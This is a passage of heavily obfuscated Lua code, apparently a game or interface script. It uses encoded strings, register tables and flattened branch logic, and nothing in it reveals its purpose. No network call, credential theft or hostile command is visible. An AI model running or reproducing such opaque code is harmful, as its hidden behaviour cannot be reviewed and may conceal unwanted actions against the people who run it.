Ee=ze(De,ue)Ce=de[Ee]Ee=s[O]Se=2636452713532-(-1028239)De=s[Y]ue=De(Ge,Se)ze=Ee[ue]Ee=false de={[ze]=Ee}Ge=z(526624-550623)Ee=s[O]De=s[Y]Se=29650929396741-931350 ue=De(Ge,Se)ze=Ee[ue]De=z(934249-957968)Ee=false b={[m]=t;[V]=f;[X]=J;[Ce]=de,[ze]=Ee}U=U(x,b)Ee=-180018+27024759222362 J=-578933+33747340497623 X=z(773085-797160)t=s[O]de=-232683+1134941474555 Be=z(-285044-(-261041))Ce=z(794703+-818323)V=s[Y]ze=-389015+29415960159512 f=V(X,J)m=t[f]b=z(-702331+678401)b=U[b]t=nil b=b(U,m,t)f=s[O]X=s[Y]J=X(Ce,de)V=f[J]X=s[O]J=s[Y]de=z(-595390-(-571532))Ce=J(de,ze)ze=z(-1039837-(-1015808))f=X[Ce]m=z(594757+-618306)ue=21414281392109-592122 J=s[O]Ce=s[Y]de=Ce(ze,Ee)X=J[de]de=s[O]ze=s[Y]Ee=ze(De,ue)Ce=de[Ee]ze=s[M]ue=s[O]Ge=s[Y]Se=Ge(Be,se)De=ue[Se]m=b[m]x=nil Se=s[O]Be=s[Y]se=Be(le,je)Ge=Se[se]ue=k..Ge Ee=De..ue de=ze..Ee J=Ce..de t={[V]=f;[X]=J}m=m(b,t)de=31133777306368-584287 f=s[O]Ce=z(349270+-373121)m=z(614606-638155)X=s[Y]J=X(Ce,de)de=z(-923433-(-899373))ze=16712203614762-564164 m=b[m]Ee=466884+18613060764183 V=f[J]X=s[O]J=s[Y]Ce=J(de,ze)ze=z(1013280-1037229)f=X[Ce]J=s[O]Ce=s[Y]de=Ce(ze,Ee)X=J[de]J=s[n]t={[V]=f,[X]=J}m=m(b,t)f=s[O]de=-28017+16433496427349 X=s[Y]Ce=z(609262-633007)J=X(Ce,de)V=f[J]X=s[O]de=z(562561+-586316)J=s[Y]ze=28353524377120-(-527731)Ce=J(de,ze)f=X[Ce]Ee=-848496+14714832702772 ze=z(-29184-(-5589))J=s[O]Ce=s[Y]de=Ce(ze,Ee)X=J[de]m=z(208173+-232006)m=b[m]J=L(13037838-(-673807),{n})t={[V]=f,[X]=J}m=m(b,t)b=nil U=nil else o=C e=not l w=e C=e and 968287+-154721 or 8589755-475543 end end else if C<13199471-648283 then if C<13094426-573447 then C=O C=l and 190616+7943003 or 7931775-949896 else C=g C=N and 9344403-333626 or 15858521-450277 end else w=s[u[-254093-(-254095)]]n=312141+12152865919694 o=s[u[129005-129002]]c=-194053+18480763262882 Q=z(446437-470381)C=j e=o(Q,n)j=B n=z(-756773-(-733081))B=z(-796338+772361)B=j[B]Y=w[e]B=B(j,Y)Y=P()s[Y]=B o=s[u[-784729+784731]]e=s[u[399391+-399388]]B=z(994086-1018142)B=j[B]Q=e(n,c)w=o[Q]B=B(j,w)w=P()s[w]=B o=C Q=s[Y]e=not Q B=e C=e and 5036+3045935 or 14234257-(-850696)end end else if C<13896558-942715 then if C<778926+12119039 then if C<13682641-911279 then s[O]=A X=781795-781794 f=s[k]V=f+X t=m[V]v=N+t t=-707107+707363 C=v%t V=s[x]t=g+V V=-520478-(-520734)N=C v=t%V g=v C=5240855-(-240427)else B=s[u[-353584+353588]]Q=z(-784969+760929)Q=B[Q]Q=Q(B)C=16363463-616447 end else if C<-817476+13769796 then j=12601155-971741 B=643007+11647871 O=z(892137+-916028)l=O^j C=B-l B=z(-1028980-(-1005204))l=C C=B/l B={C}C=d[z(476371+-500045)]else B=z(777582+-801483)O=z(-99977-(-76304))C=d[B]O=C[O]l=s[u[-521520+521521]]B={O(C,l)}B={E(B)}C=d[z(1010355-1034325)]end end else if C<13658807-634378 then if C<12053823-(-905254)then f=-54935-(-54937)C=465255-447811 V=m[f]f=s[b]t=V==f A=t else C=s[u[-231755-(-231756)]]O=z(933662+-957374)O=C[O]l=s[u[467589+-467587]]B={O(C,l)}C=d[z(-735337+711721)]B={E(B)}end else m=z(141612-165513)Ce=882840+12619383774812 U=z(903487+-927038)x=d[U]b=d[m]J=z(-308896+285277)V=s[O]f=s[Y]X=f(J,Ce)t=V[X]Ce=23857643536850-431725 V=z(217776+-241449)V=b[V]m={V(b,t)}Ge=-666851+20997592044308 Ee=1016126+8449508134432 U=x(E(m))x=U()ue=1061060078968-(-382070)U=P()s[U]=x x=s[U]ze=-797589+7330187327722 V=s[O]f=s[Y]le=411098+23212687516767 Be=675002+26173587022562 J=z(-674669-(-650628))X=f(J,Ce)t=V[X]f=s[O]de=14142790755433-461488 Ce=z(-442934-(-419040))X=s[Y]J=X(Ce,de)V=f[J]de=z(129713-153252)X=s[O]J=s[Y]De=34460021960408-1044522 Ce=J(de,ze)f=X[Ce]J=s[O]ze=z(-131704-(-107833))Ce=s[Y]de=Ce(ze,Ee)X=J[de]Ce=s[O]Ze=628264+3108718964607 Se=z(790659-814283)Ee=z(594776+-618414)de=s[Y]ze=de(Ee,De)J=Ce[ze]de=s[O]b=z(-544747+520975)b=x[b]De=z(984693-1008347)ze=s[Y]Ee=ze(De,ue)Ce=de[Ee]ue=z(905175+-928968)ze=s[O]Re=18032089985324-(-192416)Ee=s[Y]De=Ee(ue,Ge)de=ze[De]De=s[O]ue=s[Y]Ge=ue(Se,Be)Ee=De[Ge]Be=30566915630639-306838 De=false ze={[Ee]=De}Se=z(-538292+514678)De=s[O]ue=s[Y]Ge=ue(Se,Be)Ee=De[Ge]De=false m={[t]=V,[f]=X,[J]=Ce;[de]=ze,[Ee]=De}b=b(x,m)X=z(503468+-527116)J=23706883173054-(-262241)t=s[O]Ee=-717556+27253518083206 Oe=21354428453187-(-972180)ze=35172220584984-230430 V=s[Y]x=z(104963-128893)x=b[x]Ce=-803508+33885695033431 f=V(X,J)m=t[f]t=nil x=x(b,m,t)V=s[O]J=z(-250780+227212)m=z(779655+-803438)f=s[Y]ue=z(-516790+493130)X=f(J,Ce)t=V[X]m=x[m]V=true de=13779321203631-(-224609)m=m(x,t,V)V=z(-482356+458676)t=d[V]f=s[O]X=s[Y]Ye=5474594723288-707555 Ce=z(-1006124+982162)J=X(Ce,de)V=f[J]m=t[V]Ce=z(-181130-(-157118))ye=-313394+14754185552648 f=s[O]de=24234100569124-526352 X=s[Y]J=X(Ce,de)Me=9224363580608-(-78855)V=f[J]t=m(V)de=z(-162435+138348)Fe=-506830+22100372038657 X=s[O]J=s[Y]Ce=J(de,ze)ze=z(79900-103813)f=X[Ce]Ge=-354037+4710446149510 De=-102377+16382878625205 J=s[O]Ce=s[Y]m=z(-723340+699791)de=Ce(ze,Ee)X=J[de]se=z(-611765-(-587855))Ee=z(-673400-(-649355))Ce=s[O]de=s[Y]ze=de(Ee,De)J=Ce[ze]ze=s[O]Pe=z(-314908+291198)Ee=s[Y]De=Ee(ue,Ge)de=ze[De]Ee=s[M]Ge=s[O]Se=s[Y]Be=Se(se,le)ue=Ge[Be]se=s[O]le=s[Y]je=le(Pe,Oe)Be=se[je]Se=Be..k Ge=t..Se De=ue..Ge ze=Ee..De Ce=de..ze V={[f]=X,[J]=Ce}ze=143308+4470319978581 De=z(-864686-(-841101))m=x[m]m=m(x,V)V=P()de=z(-218631-(-195073))s[V]=m X=s[O]m=z(-276351-(-252568))J=s[Y]Ce=J(de,ze)ue=476372+3735698457079 f=X[Ce]X=true je=-687856+17569372626661 m=x[m]ce=16782262268377-(-552109)m=m(x,f,X)f=P()m=false Ce=z(-718706-(-694805))s[f]=m J=d[Ce]de=s[O]Ne=20340510771610-795803 ze=s[Y]Ee=ze(De,ue)Ce=de[Ee]De=19432212779694-(-905386)Be=33617459619026-(-170068)X=J[Ce]Ce=s[O]de=s[Y]Ee=z(-818865+794981)Ge=10607989438913-(-366986)Se=27526954249042-(-263872)ze=de(Ee,De)De=z(-669488+645855)Pe=-55848+13556489695952 J=Ce[ze]m=X[J]X=P()s[X]=m J=z(-9774-14127)m=d[J]ue=5349657771317-(-674950)de=s[O]se=z(740294+-764218)ze=s[Y]Ee=ze(De,ue)Ce=de[Ee]J=z(162228-185900)J=m[J]J=J(m,Ce)ue=z(-238430-(-214669))ze=s[O]Ee=s[Y]m=z(151536-175365)De=Ee(ue,Ge)Ge=z(-534752-(-510869))de=ze[De]Ee=s[O]De=s[Y]ue=De(Ge,Se)re=21470778157129-(-802501)m=x[m]le=120278162747-(-598781)ze=Ee[ue]Se=z(-855723-(-831701))De=s[O]ue=s[Y]Ge=ue(Se,Be)Ee=De[Ge]De=false Ge=s[O]Se=s[Y]Be=Se(se,le)ue=Ge[Be]le=z(428654+-452733)Se=s[O]Be=s[Y]se=Be(le,je)je=z(-594331+570340)Ge=Se[se]Be=s[O]se=s[Y]le=se(je,Pe)Se=Be[le]Be=r(373592+11746984,{f})je=9249100163001-(-321817)Ce={[de]=ze,[Ee]=De,[ue]=Ge,[Se]=Be}Ge=2236363844567-501702 De=z(-842712+819062)se=z(-81591+57603)m=m(x,Ce)ue=317664+24002296009416 de=s[O]Oe=876238+29543877007087 ze=s[Y]Ee=ze(De,ue)Ce=de[Ee]de=F(9935206-111663,{f,X,O,Y})m=J[Ce]ue=z(607325-630994)Be=964024+27111272217496 Ce=z(888586-912596)Ce=m[Ce]Ce=Ce(m,de)Ce=s[X]ze=s[O]Ee=s[Y]De=Ee(ue,Ge)de=ze[De]Se=405085+20199372125793 m=Ce[de]de=I(-175242+6737623,{O,Y;f})Ce=z(-1044071+1020061)ue=z(-787403+763569)Ce=m[Ce]Ge=-621129+33962547443728 Ce=Ce(m,de)ze=s[O]Ee=s[Y]De=Ee(ue,Ge)de=ze[De]Ee=s[O]De=s[Y]Ge=z(755129-779195)ue=De(Ge,Se)Pe=27099121240405-(-190454)ze=Ee[ue]Se=z(207646-231442)De=s[O]ue=s[Y]Ge=ue(Se,Be)le=12557496005527-(-140096)Ee=De[Ge]m=z(-158548-(-134719))De=false m=x[m]Ge=s[O]Se=s[Y]Be=Se(se,le)we=z(-45074+21373)ue=Ge[Be]Se=s[O]Be=s[Y]le=z(-119665+96044)se=Be(le,je)Ge=Se[se]Be=s[O]se=s[Y]je=z(59370+-83000)le=se(je,Pe)Se=Be[le]Be=I(9224519-808811,{O,Y})Ce={[de]=ze,[Ee]=De,[ue]=Ge,[Se]=Be}m=m(x,Ce)Se=31343782196098-686719 Ge=z(412583-436607)Ee=s[O]De=s[Y]ue=De(Ge,Se)ze=Ee[ue]Be=1133927658315-815419 De=s[O]ue=s[Y]se=-778492+6696420076842 Se=z(-707013+682943)Ge=ue(Se,Be)Ee=De[Ge]Be=z(-304842-(-280927))je=584+27836270604378 le=z(-854967-(-830983))ue=s[O]Ge=s[Y]Se=Ge(Be,se)Ge=-164954-(-164955)De=ue[Se]Se=67463-66963 ue={Ge,Se}Se=s[O]Be=s[Y]se=Be(le,je)Ge=Se[se]Se=-579531-(-579532)se=s[O]le=s[Y]Pe=z(-321181-(-297173))je=le(Pe,Oe)Oe=z(403616+-427577)Be=se[je]le=s[O]je=s[Y]Pe=je(Oe,Ye)Ye=z(488876-512512)se=le[Pe]je=s[O]Te=-625951+12851271672959 Pe=s[Y]Oe=Pe(Ye,Te)le=je[Oe]Oe=s[O]je=241258-241242 Ye=s[Y]Te=Ye(we,re)Pe=Oe[Te]Ye=s[O]re=z(-146399+122610)Te=s[Y]we=Te(re,Re)Oe=Ye[we]oe=-275383+22536146754741 Te=s[O]Re=z(982744-1006585)we=s[Y]re=we(Re,Fe)Ce=z(472315+-496139)Ye=Te[re]Ce=x[Ce]Te=h(10509975-(-53891),{O;Y})de={[ze]=Ee,[De]=ue,[Ge]=Se,[Be]=se,[le]=je;[Pe]=Oe,[Ye]=Te}Se=z(-1046221-(-1022490))Ce=Ce(x,de)Be=-494850+24350015256908 De=s[O]le=11704344103833-(-887217)ue=s[Y]Ge=ue(Se,Be)je=z(113021-136818)Ee=De[Ge]Oe=z(-1042354+1018691)Be=z(-766488+742665)ue=s[O]Pe=20399893041865-372142 Ye=17551413211135-823314 Ge=s[Y]se=788471+11106237893692 Se=Ge(Be,se)Re=475519+22429673318221 De=ue[Se]Ge=s[O]Se=s[Y]se=z(-1038857+1014881)Be=Se(se,le)ue=Ge[Be]Be=-971638-(-972138)Se=-1044560+1044561 Ge={Se,Be}Be=s[O]we=772102+8792352212984 se=s[Y]le=se(je,Pe)Se=Be[le]le=s[O]Be=853039-853038 je=s[Y]Pe=je(Oe,Ye)se=le[Pe]Te=18702990379067-(-596426)je=s[O]Pe=s[Y]Ye=z(132364-156251)Oe=Pe(Ye,Te)le=je[Oe]Fe=25821916055070-333606 Pe=s[O]Te=z(-350920+327073)ie=19807208375626-368963 Oe=s[Y]Ye=Oe(Te,we)je=Pe[Ye]he=-303581+5866719571080 re=z(-209130-(-185264))Ye=s[O]Pe=75345-75329 Te=s[Y]we=Te(re,Re)de=z(-627450+603626)de=x[de]Oe=Ye[we]Te=s[O]we=s[Y]Re=z(352234+-376076)re=we(Re,Fe)Ye=Te[re]we=s[O]Fe=z(-116465-(-92470))re=s[Y]Re=re(Fe,ye)Te=we[Re]we=I(16658827-283483,{O;Y})ze={[Ee]=De,[ue]=Ge,[Se]=Be;[se]=le,[je]=Pe,[Oe]=Ye;[Te]=we}de=de(x,ze)Se=z(943974+-967777)Be=21790254608417-(-440193)De=s[O]ue=s[Y]Ge=ue(Se,Be)ze=z(-437844+413914)se=-210971+25717609342690 Ee=De[Ge]Pe=985501+31192202161952 Be=z(-472439+448569)De=nil ze=b[ze]ze=ze(b,Ee,De)Ee=z(43501-67284)ue=s[O]Ge=s[Y]Ye=z(541100-564836)Se=Ge(Be,se)De=ue[Se]je=435994+16149760390726 se=z(-794539+770837)Te=28007142864625-(-539648)le=15155873147944-790679 Ee=ze[Ee]ue=true Ee=Ee(ze,De,ue)Ge=s[O]Se=s[Y]Be=Se(se,le)ue=Ge[Be]Se=s[O]le=z(-1001186+977480)Be=s[Y]se=Be(le,je)Ge=Se[se]je=z(-852181+828511)Be=s[O]se=s[Y]le=se(je,Pe)we=15821697032181-1033006 Se=Be[le]le=z(-289789+265900)se=d[le]je=s[O]Pe=s[Y]Oe=Pe(Ye,Te)le=je[Oe]Te=z(253256-276951)Pe=-580.09 Re=1852284016789-(-469705)Be=se[le]je=245.68 le=-908920+908168.5 se=Be(le,je,Pe)le=z(95170+-118725)De={[ue]=Ge;[Se]=se}Se=s[O]je=2436166669524-(-1027994)Be=s[Y]ge=31182370799227-(-883261)Oe=14923143168663-337778 se=Be(le,je)Ge=Se[se]je=z(639027-662917)Be=s[O]re=-54794+16827969598630 Pe=-149394+14039921369371 se=s[Y]le=se(je,Pe)Se=Be[le]se=s[O]le=s[Y]Pe=z(105104+-128719)je=le(Pe,Oe)Be=se[je]je=z(343812+-367701)le=d[je]Pe=s[O]Oe=s[Y]Ye=Oe(Te,we)je=Pe[Ye]Ie=-616976+24956043073397 se=le[je]je=-626.76 Oe=-135.3 Ye=-163735+25832419585684 Pe=221.44 le=se(je,Pe,Oe)ue={[Ge]=Se,[Be]=le}we=z(527446-551131)Be=s[O]Pe=1514279951648-(-763297)Qe=-141504+7456365114960 se=s[Y]je=z(427890+-451846)le=se(je,Pe)Se=Be[le]se=s[O]Pe=z(190976-215052)Oe=-451038+27471121716182 le=s[Y]je=le(Pe,Oe)Be=se[je]le=s[O]Oe=z(478948-502967)je=s[Y]Pe=je(Oe,Ye)se=le[Pe]Pe=z(-287828-(-263939))je=d[Pe]Oe=s[O]Ye=s[Y]Te=Ye(we,re)Ye=-104.02 Pe=Oe[Te]le=je[Pe]Pe=-347.17 Te=-710551+28532315245437 Oe=227.39 Fe=6550999180438-(-911188)je=le(Pe,Oe,Ye)Ge={[Se]=Be;[se]=je}Pe=z(-467230+443664)se=s[O]le=s[Y]Oe=180334+16636763741653 Ye=1754285200348-(-814932)ye=-705263+24447242448743 je=le(Pe,Oe)Be=se[je]le=s[O]Oe=z(-137149+113496)je=s[Y]Pe=je(Oe,Ye)se=le[Pe]je=s[O]Ye=z(896960+-920549)Pe=s[Y]Oe=Pe(Ye,Te)re=z(876988+-900874)le=je[Oe]Oe=z(894024-917913)Pe=d[Oe]Ye=s[O]Te=s[Y]we=Te(re,Re)Oe=Ye[we]Te=333128+-332825 je=Pe[Oe]Oe=-393.51 Ye=218.98 Pe=je(Oe,Ye,Te)Oe=z(-817242-(-793625))Ye=-871969+19305699275070 Se={[Be]=se;[le]=Pe}Re=z(-216099-(-192321))le=s[O]we=10644637301980-(-169600)je=s[Y]Te=97583+12050933323964 Pe=je(Oe,Ye)Ye=z(863408-887098)se=le[Pe]je=s[O]ne=25164252888151-151185 Pe=s[Y]Oe=Pe(Ye,Te)le=je[Oe]Pe=s[O]Te=z(-503465+479401)Oe=s[Y]Ye=Oe(Te,we)je=Pe[Ye]Ye=z(-924856-(-900967))Oe=d[Ye]Te=s[O]we=s[Y]re=we(Re,Fe)Ye=Te[re]we=-60.27 Te=233.57 Pe=Oe[Ye]Ye=-437.62 Oe=Pe(Ye,Te,we)Te=-867431+2688477905226 Ye=z(-984178+960410)Be={[se]=le,[je]=Oe}ee=27051312413090-(-63378)we=724305+25398821986530 je=s[O]Pe=s[Y]Oe=Pe(Ye,Te)Fe=z(308430+-332155)le=je[Oe]Pe=s[O]Oe=s[Y]Te=z(830692+-854357)re=389722+12231052436453 Ye=Oe(Te,we)je=Pe[Ye]Oe=s[O]we=z(308817-332868)Ye=s[Y]Te=Ye(we,re)Pe=Oe[Te]Te=z(436058+-459947)Ye=d[Te]we=s[O]re=s[Y]Re=re(Fe,ye)Te=we[Re]re=62.08 we=269.24 Oe=Ye[Te]Te=-642.41 Re=-889742+9919198733720 Ye=Oe(Te,we,re)se={[le]=je;[Pe]=Ye}we=5934851810255-(-812796)Pe=s[O]re=3391244874379-(-283552)Te=z(-741002-(-717180))Oe=s[Y]Ye=Oe(Te,we)je=Pe[Ye]Oe=s[O]we=z(-13726+-10252)Ye=s[Y]Te=Ye(we,re)re=z(-658135-(-634263))Pe=Oe[Te]Ye=s[O]Te=s[Y]we=Te(re,Re)Oe=Ye[we]we=z(216519+-240408)Te=d[we]re=s[O]ye=z(-529862-(-506223))Re=s[Y]Fe=Re(ye,Ie)we=re[Fe]Ye=Te[we]re=293.24 we=-720.3 Re=167.14 Te=Ye(we,re,Re)le={[je]=Pe;[Oe]=Te}Ie=z(302287-326203)we=z(-408786-(-384926))Oe=s[O]Ye=s[Y]re=-497157+25895219512607 Re=346900+31709452545689 Te=Ye(we,re)Pe=Oe[Te]Ye=s[O]Fe=15489280269291-786367 Te=s[Y]re=z(-1015949+992144)we=Te(re,Re)Oe=Ye[we]Te=s[O]we=s[Y]Re=z(-289393-(-265412))re=we(Re,Fe)Ye=Te[re]re=z(-4876-19013)we=d[re]Re=s[O]Fe=s[Y]ye=Fe(Ie,he)he=z(-1048872-(-1025140))re=Re[ye]Te=we[re]re=-1007.7 Re=446.35 Fe=-237.92 we=Te(re,Re,Fe)je={[Pe]=Oe,[Ye]=we}Fe=11497110257766-(-267395)Re=144487+12674841485991 Ye=s[O]Te=s[Y]re=z(-461380+437317)we=Te(re,Re)ye=-652965+33873863324738 Re=z(726589+-750453)Oe=Ye[we]Te=s[O]we=s[Y]Le=-111976+15111009439972 re=we(Re,Fe)Ye=Te[re]we=s[O]re=s[Y]Fe=z(210431+-234059)Re=re(Fe,ye)Te=we[Re]Re=z(-359068-(-335179))re=d[Re]Fe=s[O]ye=s[Y]Ie=ye(he,Le)Re=Fe[Ie]Fe=440.88 we=re[Re]ye=-621.22 Re=-1348.07 re=we(Re,Fe,ye)Pe={[Oe]=Ye,[Te]=re}Ie=30932704876107-(-451065)Te=s[O]Fe=-308815+25537032070338 we=s[Y]Re=z(-351667+327901)re=we(Re,Fe)Ye=Te[re]Le=z(894079-917678)we=s[O]Fe=z(899280+-923364)re=s[Y]ye=-883882+13612634281324 Re=re(Fe,ye)ye=z(-60322+36536)Te=we[Re]re=s[O]Re=s[Y]Fe=Re(ye,Ie)we=re[Fe]Fe=z(-299381-(-275492))Re=d[Fe]ye=s[O]Ie=s[Y]he=Ie(Le,ee)Fe=ye[he]he=-233550+8694910148638 re=Re[Fe]Fe=-1452.87 Ie=-542.71 ye=445.94 Re=re(Fe,ye,Ie)ee=z(905965-929957)ye=-192752+5899382750123 Fe=z(-1007795+983802)Oe={[Ye]=Te,[we]=Re}Ie=-132322+21580752776227 we=s[O]re=s[Y]Re=re(Fe,ye)Te=we[Re]re=s[O]Re=s[Y]ye=z(200093+-223720)Fe=Re(ye,Ie)we=re[Fe]Ie=z(-1024356-(-1000517))Re=s[O]Fe=s[Y]ye=Fe(Ie,he)re=Re[ye]ye=z(-92875+68986)Fe=d[ye]Ie=s[O]he=s[Y]Le=he(ee,oe)ye=Ie[Le]Ie=414.23 he=320.03 Re=Fe[ye]ye=-1156.98 Fe=Re(ye,Ie,he)oe=z(972827-996584)ye=z(-748649-(-724677))Le=24388431155505-189653 Ye={[Te]=we;[re]=Fe}Ie=23335039649642-990456 re=s[O]he=2042852862724-517965 Re=s[Y]Fe=Re(ye,Ie)we=re[Fe]Re=s[O]Ie=z(-748808+724736)Fe=s[Y]ye=Fe(Ie,he)re=Re[ye]Fe=s[O]ye=s[Y]he=z(681575-705482)Ie=ye(he,Le)Re=Fe[Ie]Ie=z(127062+-150951)ye=d[Ie]he=s[O]Le=s[Y]ee=Le(oe,Qe)Ie=he[ee]he=420.88 Le=606.01 Fe=ye[Ie]Ie=313154.25-314736 ye=Fe(Ie,he,Le)Te={[we]=re,[Re]=ye}ee=820618+14007364244464 Ie=z(-725510-(-701904))Le=393686+35033068043747 Re=s[O]Fe=s[Y]he=14093785982793-216487 ye=Fe(Ie,he)re=Re[ye]he=z(930576+-954516)Fe=s[O]ye=s[Y]Ie=ye(he,Le)Le=z(-492445-(-468793))Re=Fe[Ie]ye=s[O]Ie=s[Y]he=Ie(Le,ee)Fe=ye[he]Qe=z(-876434+852512)he=z(-721000+697111)Ie=d[he]Le=s[O]ee=s[Y]oe=ee(Qe,ce)he=Le[oe]ee=332.01 Le=414.56 ye=Ie[he]he=-1577.27 Ie=ye(he,Le,ee)we={[re]=Re;[Fe]=Ie}he=z(995173+-1019124)Fe=s[O]ye=s[Y]Le=25247519820793-777741 Ie=ye(he,Le)Le=z(-1032417+1008373)Re=Fe[Ie]ee=-700694+26238418608336 ye=s[O]ce=z(814909+-838994)Ie=s[Y]he=Ie(Le,ee)Fe=ye[he]Ie=s[O]ee=z(-917421+893489)oe=284650+6045132174100 he=s[Y]Le=he(ee,oe)ye=Ie[Le]Le=z(-743621+719732)he=d[Le]ee=s[O]oe=s[Y]Qe=oe(ce,ge)Le=ee[Qe]Ie=he[Le]ee=412.4 oe=524.96 Le=-1286.15 he=Ie(Le,ee,oe)ee=29629662480637-(-584936)oe=454454+15964329864659 Le=z(953418-977030)re={[Re]=Fe;[ye]=he}ye=s[O]Qe=-255361+20954042289054 Ie=s[Y]he=Ie(Le,ee)ge=z(-304306-(-280450))Fe=ye[he]ee=z(-200347-(-176529))Ie=s[O]he=s[Y]Le=he(ee,oe)ye=Ie[Le]oe=z(192259-216218)he=s[O]Le=s[Y]ee=Le(oe,Qe)Ie=he[ee]ee=z(-906343-(-882454))Le=d[ee]oe=s[O]Qe=s[Y]ce=Qe(ge,Ne)ee=oe[ce]he=Le[ee]oe=451.89 ee=-1129.28 Qe=-61.97 Le=he(ee,oe,Qe)ee=z(829727-853691)Qe=-255562+1258949666964 C=866437+10004291 oe=12489411062230-(-44257)Re={[Fe]=ye,[Ie]=Le}Ie=s[O]ce=546599+26207228696708 he=s[Y]Le=he(ee,oe)ye=Ie[Le]oe=z(-42130+18143)he=s[O]Le=s[Y]Ne=z(-723857+700309)ee=Le(oe,Qe)Ie=he[ee]Le=s[O]ee=s[Y]Qe=z(605062-629007)oe=ee(Qe,ce)he=Le[oe]oe=z(-157546-(-133657))ee=d[oe]Qe=s[O]ce=s[Y]ge=ce(Ne,ne)ce=-21.61 oe=Qe[ge]Qe=452.27 ge=5090889498992-(-460754)Le=ee[oe]oe=-1409.57 ee=Le(oe,Qe,ce)Fe={[ye]=Ie,[he]=ee}he=s[O]oe=z(-980692+956615)Qe=-373466+12756060310030 Le=s[Y]ee=Le(oe,Qe)Ie=he[ee]Qe=z(706449+-730018)Le=s[O]ee=s[Y]ne=z(-855273+831469)ce=563308+24896719246557 oe=ee(Qe,ce)he=Le[oe]ce=z(226027-249980)ee=s[O]oe=s[Y]Qe=oe(ce,ge)Le=ee[Qe]Qe=z(25104-48993)oe=d[Qe]ce=s[O]ge=s[Y]Ne=ge(ne,Ze)Qe=ce[Ne]ce=469.46 ee=oe[Qe]Qe=-1618.8 ge=-63.8 oe=ee(Qe,ce,ge)ye={[Ie]=he;[Le]=oe}ce=3324981038716-(-63376)Le=s[O]Qe=z(10588-34306)ee=s[Y]ge=442553+839222739149 oe=ee(Qe,ce)he=Le[oe]Ne=30160032453004-383664 ee=s[O]ce=z(-332468-(-308884))oe=s[Y]We=608566+10570641787396 Qe=oe(ce,ge)Le=ee[Qe]Ze=z(-816909+793283)oe=s[O]Qe=s[Y]ge=z(-184470+160539)ce=Qe(ge,Ne)ee=oe[ce]ce=z(-835291-(-811402))Qe=d[ce]ge=s[O]Ne=s[Y]ne=Ne(Ze,Me)ce=ge[ne]Ne=-194.18 oe=Qe[ce]ge=-486171-(-486663)ce=-1889.65 Qe=oe(ce,ge,Ne)Ie={[he]=Le;[ee]=Qe}Ne=561647+3670569317566 Me=z(976438-1000222)ee=s[O]ge=22419976333568-491576 oe=s[Y]ce=z(804704+-828589)Qe=oe(ce,ge)Le=ee[Qe]oe=s[O]ge=z(-173080+149048)Qe=s[Y]ce=Qe(ge,Ne)ne=-812046+31760510950867 ee=oe[ce]Qe=s[O]ce=s[Y]Ne=z(-948130-(-924189))ge=ce(Ne,ne)oe=Qe[ge]ge=z(290818+-314707)ce=d[ge]Ne=s[O]ne=s[Y]Ze=ne(Me,We)ge=Ne[Ze]ne=-599.01 Qe=ce[ge]ge=-1996.82 Ne=437.06 Ze=470776+18027006898642 ce=Qe(ge,Ne,ne)he={[Le]=ee,[oe]=ce}Ne=977366+5713421262990 ne=-464531+20964569463989 oe=s[O]ge=z(-73415-(-49822))Qe=s[Y]ce=Qe(ge,Ne)ee=oe[ce]Qe=s[O]Ne=z(-182126+158166)ce=s[Y]ge=ce(Ne,ne)ne=z(463671+-487496)oe=Qe[ge]ce=s[O]ge=s[Y]Ne=ge(ne,Ze)Qe=ce[Ne]Ne=z(151787+-175676)ge=d[Ne]ne=s[O]Ze=s[Y]We=z(567890+-591793)Me=Ze(We,ie)Ne=ne[Me]ce=ge[Ne]Ne=-2592.81 ne=516.42 Ze=2.07 ge=ce(Ne,ne,Ze)Le={[ee]=oe;[Qe]=ge}Ee={De,ue,Ge,Se;Be,se,le;je;Pe;Oe,Ye,Te,we;re;Re,Fe;ye;Ie,he;Le}ue=z(-557409-(-533692))De=d[ue]Be={De(Ee)}Se=Be[-1033840+1033843]ue=Be[-634842+634843]Ge=Be[-52968-(-52970)]end end end end end else if C<-145818+15025990 then if C<582829+13341038 then if C<204301+13387874 then if C<14079252-813406 then if C<-307785+13499781 then if C<12257633-(-909552)then o=z(299829-323724)C=true O=z(-502356-(-478734))s[u[462360+-462359]]=C l=d[O]e=-231211+5856945099218 j=s[u[-570798+570800]]Y=s[u[-804697-(-804700)]]w=Y(o,e)O=j[w]B=l[O]j=F(756513+2008984,{u[-461493-(-461494)]})C=d[z(-137503-(-113473))]O=.4 l=B(O,j)B={}else x=not p W=W+a M=W<=H M=x and M x=W>=H x=p and x M=x or M x=589447+6079796 C=M and x M=883181+5908383 C=C or M end else if C<13808014-574093 then C=d[z(-431781+408126)]B={}else Ge=s[O]De=z(-957103-(-933173))Se=s[Y]le=-808450+33908808324016 se=z(-702588+678565)je=-222995+33026347606822 Be=Se(se,le)ee=93071+10719736801264 De=b[De]ue=Ge[Be]Ee=nil Ge=nil De=De(b,ue,Ge)le=z(-363097-(-339454))Se=s[O]Be=s[Y]se=Be(le,je)Ge=Se[se]Se=true oe=-797149+18804188138513 Fe=28344647937723-(-34004)le=nil J=nil Qe=-551311+22633159578298 re=z(-367390-(-343829))ue=z(-319126+295343)Be=false ue=De[ue]ue=ue(De,Ge,Se)C=-948424+11538190 ue=false je=P()ne=-26498+9292285294697 Ne=-527593+1364934135652 Ge=P()s[Ge]=ue X=T(X)ue=353821+-353721 Se=P()s[Se]=ue Re=422219+5037543135198 ue=false se=P()s[se]=ue ue=P()he=18552647505263-160688 s[ue]=Be Be=nil s[je]=Be Be=P()s[Be]=le Ye=s[O]Te=s[Y]we=Te(re,Re)Oe=Ye[we]Te=s[O]Ie=z(-767133-(-743531))ye=11969437782912-(-344645)Re=z(-949142+925348)we=s[Y]re=we(Re,Fe)Fe=z(703675-727481)Ye=Te[re]Le=-72843+5623123781317 we=s[O]re=s[Y]Re=re(Fe,ye)Te=we[Re]Re=s[O]le=z(-221182-(-197353))Fe=s[Y]we=false ye=Fe(Ie,he)re=Re[ye]Fe=s[O]he=z(770431-794044)ye=s[Y]Ie=ye(he,Le)Re=Fe[Ie]le=De[le]ge=693306+16760394467906 ye=s[O]Ie=s[Y]Le=z(728175-752042)he=Ie(Le,ee)Fe=ye[he]ye=r(-301146+2548451,{Ge,O;Y;je,Be,se;ue;Se})Pe={[Oe]=Ye;[Te]=we;[re]=Re,[Fe]=ye}le=le(De,Pe)Re=24272510030727-(-645279)x=nil Ye=s[O]Te=s[Y]re=z(43686+-67728)we=Te(re,Re)ye=-336404+10764596180392 